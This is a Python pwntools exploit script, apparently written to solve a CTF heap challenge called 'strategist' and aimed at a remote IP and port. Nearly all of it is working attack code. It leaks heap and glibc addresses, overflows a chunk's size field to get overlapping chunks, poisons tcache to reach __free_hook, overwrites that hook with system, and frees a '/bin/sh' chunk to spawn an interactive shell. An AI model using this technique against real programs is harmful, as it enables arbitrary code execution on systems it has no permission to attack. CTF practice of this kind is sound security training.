from pwn import *
import sys
import os

BINARY = "./strategist"

context.binary = BINARY
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF("./glibc/libc.so.6")

gdbscript = """
b main
b edit_plan
continue
continue
"""

elf = ELF(BINARY)


def create(p, size, payload):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'> ')
    p.sendline(str(size))
    p.recvuntil(b'> ')
    p.send(payload)


def show(p, n):
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'> ')
    p.sendline(str(n))


def edit(p, n, payload):
    p.recvuntil(b'> ')
    p.sendline(b'3')
    p.recvuntil(b'> ')
    p.sendline(str(n))
    p.recvuntil(b'> ')
    p.send(payload)


def delete(p, n):
    p.recvuntil(b'> ')
    p.sendline(b'4')
    p.recvuntil(b'> ')
    p.sendline(str(n))


def start(argv=[]):
    if args.GDB:
        return gdb.debug([BINARY], gdbscript=gdbscript)
    else:
        return remote("94.237.48.147", 55053)


def main():
    p = start()

    #allocating 2 chunks to avoid consolidation (there is not so why am i doing it?
    #for the glory and future reference)
    for i in range(2):
        create(p, 16, b"A"*16)

    for i in range(2):
        delete(p, i)

    for i in range(2):
        create(p, 16, b"\n")

    #heap leak 
    #not using it since not gonna perform safe unlink
    show(p, 0)
    print(p.recvuntil(b']: \n'))
    data = b"A" + p.recvuntil(b'\n').rstrip(b'\n')
    data = u64(data.ljust(8,b"\x00"))
    print(data,'\n', hex(data))
    heap_leak = data & ~0xFFF
    print('heap : ', hex(heap_leak))

    #filling tcache, to leak glibc addr from unsortedbins
    for i in range(8):
        create(p, 256, b"B"*256)
    create(p, 256, b"C"*256)

    for i in range(2,11):
        delete(p, i)

    for i in range(7):
        create(p, 256, b"D"*256)
    create(p, 256, b"\n")

    #glibc leak
    #overallocating since we can (there is not consolidation apperentely)
    show(p, 9)
    print(p.recvuntil(b']: \n'))
    data = b"A" + p.recvuntil(b'\n').rstrip(b'\n')
    data = u64(data.ljust(8,b"\x00"))
    print(data,'\n', hex(data))
    glibc_leak = (data & ~0xFFF) - 4108288
    print('glibc : ', hex(glibc_leak))
    libc.address = glibc_leak
    free_hook =  libc.sym['__free_hook']
    print('free hook: ', hex(libc.sym['__free_hook']))

    for _ in range(5):
        create(p, 24, b"E"*24)

    # overwrite chunk 11 size with 0x41 (A)
    edit(p, 10, b"A"*25)
    delete(p, 11)
    delete(p, 13)
    delete(p, 12)
    create(p, 48, b"C"*24 + p64(0x21) + p64(free_hook - 8))
    create(p, 24, b"\n")
    #overwriting free hook
    create(p, 24, b"/bin/sh\x00" + p64(libc.sym['system']) + b"\x00")
    delete(p, 13)
    
    
    p.interactive()


if __name__ == "__main__":
    main()
